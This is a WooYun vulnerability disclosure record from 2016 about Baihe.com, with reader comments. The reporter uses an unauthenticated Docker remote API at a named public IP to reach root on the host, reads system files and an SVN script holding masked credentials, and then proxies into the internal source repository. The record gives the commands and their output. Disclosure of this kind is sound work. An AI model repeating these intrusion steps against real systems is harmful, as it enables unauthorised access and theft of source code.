{"id": 87057, "wybug_id": "wooyun-2016-0210089", "wybug_title": "新姿势之获取百合网全站源码", "wybug_corp": "百合网", "wybug_author": "黑客,绝对是黑客", "wybug_date": "2016-05-18 14:22", "wybug_open_date": "2016-05-23 14:30", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源代码泄漏", "配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 没错，就是全站代码不要问我为什么这么6，请看我名字 详细说明：  先申明下没有脱代码，可查日志docker remote api未授权访问\nhttp://123.206.30.193:2375\n当前image\ndocker  -H tcp://123.206.30.193:2375 imagesREPOSITORY                                             TAG                 IMAGE ID            CREATED             VIRTUAL SIZEmysql                                                  latest              4f81531a4fa7        2 weeks ago         255.6 MBdocker.baihe.com/nginx                                 1.8                 143b72742691        3 weeks ago         263.3 MBphpfpm                                                 latest              c0a91a09e975        3 weeks ago         636.7 MBdocker.baihe.com/php5                                  latest              c0a91a09e975        3 weeks ago         636.7 MB<none>                                                 <none>              f2bea71117ab        3 weeks ago         228.9 MB<none>                                                 <none>              d397074d70d4        4 weeks ago         228.9 MB<none>                                                 <none>              60e41557d3f3        4 weeks ago         228.9 MBdocker.baihe.com/php5.5                                latest              825eb26bb666        4 weeks ago         1.057 GBdocker.baihe.com/php-fpm                               6                   4ddadfe0897d        5 weeks ago         394.3 MB<none>                                                 <none>              a79dfa92a739        6 weeks ago         302.1 MBcentos                                                 6                   61bf77ab8841        6 weeks ago         228.9 MBcentos                                                 centos6             61bf77ab8841        6 weeks ago         228.9 MBdocker.baihe.com/baiheredis                            3.0                 0723312bd82e        6 weeks ago         177.5 MBbaihe/redis                                            latest              0723312bd82e        6 weeks ago         177.5 MBdocker.baihe.com/mongo                                 latest              3b43c155fd10        6 weeks ago         309.8 MBeva/mongo                                              latest              3b43c155fd10        6 weeks ago         309.8 MBdocker.baihe.com/php                                   latest              c6cc8696a7cb        8 weeks ago         452.8 MBeva/php                                                latest              c6cc8696a7cb        8 weeks ago         452.8 MBphp                                                    5.6-fpm             c6cc8696a7cb        8 weeks ago         452.8 MBhaproxy                                                alpine              a49566cd6d57        8 weeks ago         10.63 MBdocker.baihe.com/mysql                                 latest              6863cdbe438e        9 weeks ago         361.2 MBdocker.baihe.com/baihemysql                            latest              b666e9e882a2        9 weeks ago         324.2 MBmysql                                                  5.6                 b666e9e882a2        9 weeks ago         324.2 MBeva/mysql                                              latest              b666e9e882a2        9 weeks ago         324.2 MBshipyard/shipyard                                      latest              a1d73c89bdfa        9 weeks ago         58.67 MBmillion12/haproxy                                      latest              a5b525064e6c        9 weeks ago         292.8 MBoblank/docker-centos-nginx-php-mongo-redis-memcached   latest              df7de2852d68        9 weeks ago         1.64 GBmillion12/haproxy                                      1.6.3-h2            e7bf1090906c        9 weeks ago         292.8 MBmillion12/haproxy                                      h2                  5d65cd66aede        9 weeks ago         292.8 MBfront-nginx                                            latest              36b0adefb2f3        9 weeks ago         190.5 MBdaocloud.io/nginx                                      latest              36b0adefb2f3        9 weeks ago         190.5 MBdocker.baihe.com/baihenginx                            latest              36b0adefb2f3        9 weeks ago         190.5 MBnginx                                                  latest              36b0adefb2f3        9 weeks ago         190.5 MBdocker.baihe.com/nginx                                 latest              36b0adefb2f3        9 weeks ago         190.5 MBdocker.baihe.com/centos                                latest              bb3d629a7cbc        10 weeks ago        196.6 MBcentos                                                 latest              bb3d629a7cbc        10 weeks ago        196.6 MBdocker.baihe.com/redis                                 latest              8d81cd6f6c5e        10 weeks ago        177.5 MBdocker.baihe.com/redis                                 3.0                 8d81cd6f6c5e        10 weeks ago        177.5 MBeva/redis                                              latest              8d81cd6f6c5e        10 weeks ago        177.5 MBredis                                                  3.0                 8d81cd6f6c5e        10 weeks ago        177.5 MBredis                                                  latest              8d81cd6f6c5e        10 weeks ago        177.5 MBalpine                                                 latest              2a250d324882        10 weeks ago        4.794 MBrethinkdb                                              latest              fa65be256431        10 weeks ago        181.8 MBeva/memcache                                           latest              c9df794a0454        10 weeks ago        132.2 MBmemcached                                              1.4                 c9df794a0454        10 weeks ago        132.2 MBdocker.baihe.com/memcache                              latest              c9df794a0454        10 weeks ago        132.2 MBswarm                                                  latest              fd056ae2da24        11 weeks ago        18.11 MBdebian                                                 wheezy              43d31a5a4c8c        11 weeks ago        84.88 MBdebian                                                 jessie              a582cd499e0f        11 weeks ago        125.1 MBdaocloud.io/daocloud/daocloud-toolset                  latest              b232d6774447        12 weeks ago        150.2 MBdocker.baihe.com/php-fpm                               latest              5b0fca6df07d        3 months ago        365.6 MBbitnami/php-fpm                                        latest              5b0fca6df07d        3 months ago        365.6 MBjprjr/centos-php-fpm                                   latest              d9fce68c8983        3 months ago        392 MBdocker.baihe.com/dockerui                              latest              95c8b9dc91e0        3 months ago        6.13 MBdockerui/dockerui                                      latest              95c8b9dc91e0        3 months ago        6.13 MBinternavenue/centos-nginx                              latest              8329e9f7189d        3 months ago        589 MBregistry                                               latest              07d93e41c370        3 months ago        422.8 MBjdeathe/centos-ssh                                     centos-6-1.4.1      19c6a20f72e0        4 months ago        253.2 MBshipyard/docker-proxy                                  latest              68102ad1785d        4 months ago        9.464 MBshipyard/deploy                                        latest              1f1b0dc17065        8 months ago        6.514 MBehazlett/curl                                          latest              fa495a510875        8 months ago        8.727 MBmicrobox/etcd                                          latest              d7522ca4c973        9 months ago        17.86 MBshipyard/rethinkdb                                     latest              01d0c7f830ab        11 months ago       296.2 MB<none>                                                 <none>              dc2342e12c39        11 months ago       143.8 MBkriation/centos7                                       latest              0af989cd52ff        15 months ago       223.1 MBdocker.baihe.com/centos7                               latest              0af989cd52ff        15 months ago       223.1 MB\ndocker.baihe.com 证明为百合网神奇一键拿docker外层宿主机rootid\n[root@VM_15_76_centos ~]# iduid=0(root) gid=0(root) groups=0(root)\nhosts文件也有baihe.com域名\n[root@VM_15_76_centos ~]# cat /etc/hosts127.0.0.1  localhost  localhost.localdomain  VM_15_76_centos127.0.0.1 images6.baihe.com127.0.0.1 images.baihe.com127.0.0.1 static1.baihe.com127.0.0.1 static3.baihe.com127.0.0.1 static4.baihe.com127.0.0.1 static5.baihe.com127.0.0.1 static6.baihe.com127.0.0.1 static8.baihe.com123.206.30.193 docker.baihe.com123.206.30.193 shipyard.baihe.com\nifconfig 有内网ip 10.141.15.76\n[root@VM_15_76_centos ~]# ifconfigdocker0   Link encap:Ethernet  HWaddr 06:60:E6:35:CE:0D          inet addr:172.17.42.1  Bcast:0.0.0.0  Mask:255.255.0.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:4965199 errors:0 dropped:0 overruns:0 frame:0          TX packets:5093629 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:11538564202 (10.7 GiB)  TX bytes:7761907034 (7.2 GiB)docker_new0 Link encap:Ethernet  HWaddr 42:7A:77:DD:A3:01          inet addr:192.168.6.1  Bcast:192.168.6.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)eth0      Link encap:Ethernet  HWaddr 52:54:00:76:48:23          inet addr:10.141.15.76  Bcast:10.141.63.255  Mask:255.255.192.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:95319305 errors:0 dropped:0 overruns:0 frame:0          TX packets:51909292 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000          RX bytes:24742543618 (23.0 GiB)  TX bytes:14247046227 (13.2 GiB)\n/home/work目录下文件\n[root@VM_15_76_centos ~]# cd /home/work/[root@VM_15_76_centos work]# ls -lhtotal 892Mdrwxr-xr-x  4 root root 4.0K Mar 18 15:37 backupdrwxr-xr-x  4 root root 4.0K Mar 25 16:52 baihedrwxr-xr-x  3 root root 4.0K Mar 17 15:10 datadrwxr-xr-x 23 root root 4.0K Apr 27 17:13 docker_filedrwx------  2 root root  16K Mar 16 17:34 lost+found-rw-r--r--  1 root root 261M Apr 27 11:07 nginxa.tar-rw-r--r--  1 root root   49 Mar 24 10:31 nginxregistry.log-rw-r--r--  1 root root   13 Mar 24 10:30 nginx用户名密码.log-rw-------  1 root root 133K Mar 29 11:20 nohup.out-rw-r--r--  1 root root 631M Apr 27 11:18 phpfpm.tardrwxr-xr-x  3 root root 4.0K Mar 28 14:33 shipyard-rw-r--r--  1 root root   36 Mar 24 18:34 shipyard.logdrwxr-xr-x  3 root root 4.0K Mar 18 10:37 static\n查看root的.bash_history文件，获取到以下信息\n/home/work/baihe/home/work/docker_file/nginx/conf.d/home/work/docker_file/nginx/nginx.conf\n看了代码下发现都是一些静态的html，js，图片等，没有什么有价值的然后再翻了翻，在/home/work/backup下发现一个sh脚本，看了下是svn自动更新的脚本里面暴露了svn帐号密码\n[root@VM_15_76_centos backup]# cat update.sh#!/bin/bashexport LANG=zh_CN.UTF-8echo 'svn update /home/work/backup/static/'svn update /home/work/backup/static/ --username **@baihe.com --password *** --no-auth-cache#cp -fr /home/work/backup/static/* /home/work/baihe/static/echo 'svn update /home/work/backup/fronthtml/'svn update /home/work/backup/fronthtml/ --username ***@baihe.com --password ***** --no-auth-cache#cp -fr /home/work/backup/fronthtml/* /home/work/baihe/fronthtml/rsync -auv --exclude='.svn/' /home/work/backup/ /home/work/baihe/find /home/work/baihe -name \".svn\"  | xargs rm -rfecho \"update success...\"~\n进到/home/work/baihe/fronthtml/目录，执行svn info，获取到svn地址\nhttp://211.151.58.8:1722/svn\n公网可以访问，但是都是返回 200 OK Service ready.经过测试只有内网才可以访问做了个代理，用获取到svn帐号密码，成功访问\n\n可以看到是全站的代码，包括www，ios，android等，并且都可以访问再给出几张截图证明android\n\nwww\n\nios\n\ncms\n\n点到为止   漏洞证明：     修复方案：  参考 http://drops.wooyun.org/papers/15892可否来个礼物？   版权声明：转载请注明来源 黑客,绝对是黑客@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-23 14:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-18 14:26 |    \t\tAgony \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:11        | you know a cat has nine lives.)\t\t \n  火钳    \n     2016-05-18 14:35 |    \t\t立志成为厨神的男人 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 我饿了)\t\t \n  我还是百合VIP 666    \n     2016-05-18 15:03 |    \t\tHax0rs \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:12        | Hax0rs)\t\t \n  不要问我为什么这么6，请看我名字    \n     2016-05-18 15:22 |    \t\tOrvilla \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 菜逼来学习)\t\t \n  黑客,绝对是黑客    \n     2016-05-18 15:34 |    \t\t小苹果 \t\t\t( 普通白帽子  |\t\t\t        Rank:241 漏洞数:60        | 只要锄头挥的好，哪有洞挖不到)\t\t \n  求挖墙脚    \n     2016-05-18 15:52 |    \t\t鱼岛的渔民 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | http://www.wooyun.org/)\t\t \n  不要问我为什么这么6，请看我名字    \n     2016-05-18 15:59 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:4945 漏洞数:377        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  我也扫到了，只是不敢提交    \n     2016-05-18 16:09 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  哦，原来是这个备份文件啊！    \n     2016-05-18 16:09 |    \t\ther0ma  \t\t\t( 普通白帽子  |\t\t\t        Rank:701 漏洞数:101        | 专注小厂商三十年！)\t\t \n  @猪猪侠 6666    \n     2016-05-18 16:11 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 看人生万般无奈，看世间千姿百态...)\t\t \n  到底谁的小号呢...    \n     2016-05-18 16:17 |    \t\tjdbang2016 \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:21        | 哈)\t\t \n  叼叼的    \n     2016-05-18 16:25 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:810 漏洞数:127        | ®高级安全工程师 | WooYun认证√)\t\t \n  刷着刷着就变老姿势了~    \n     2016-05-18 16:37 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:611 漏洞数:106        | 专心补刀。)\t\t \n  @猪猪侠 猪哥你为啥不敢提交    \n     2016-05-18 17:33 |    \t\tDotaer \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | 多学习，多挖洞！)\t\t \n  这个姿势真是吊啊！    \n     2016-05-18 18:58 |    \t\tGrayon \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 今天怎么不开心 :‮)\t\t \n  刚发现是百合网，就看到在主站上提交了    \n     2016-05-18 21:56 |    \t\t羊大仙 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:5        | 码字民工，说话，写字，漫画，喝咖啡，听音...)\t\t \n  @暴走 猪哥都认识！别人提交的是小号    \n     2016-05-18 23:32 |    \t\t乱舞 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 小小白)\t\t \n  下一标题:把阿里全站代码搞下来    \n     2016-05-19 09:13 |    \t\t听听鸟叫 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 看看天空)\t\t \n  不要问我为什么这么6，请看我名字    \n     2016-05-19 09:43 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:395 漏洞数:73        | 我是一只毛毛虫。)\t\t \n  不要问我为什么这么6，请看我名字    \n     2016-05-20 21:20 |    \t\t放逐 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 白帽子放逐Gg？得失乐与悲与Av Qq205655539)\t\t \n  不要问我为什么这么6，请看我名字    \n     2016-05-23 14:42 |    \t\t枫子 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | 酱油安全爱好者一枚。)\t\t \n  不要问我为什么这么6，请看我名字    \n     2016-05-23 14:54 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  @百合网 千万不要相信他没有脱代码，日志被他清理掉了痕迹！o(∩_∩)o    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}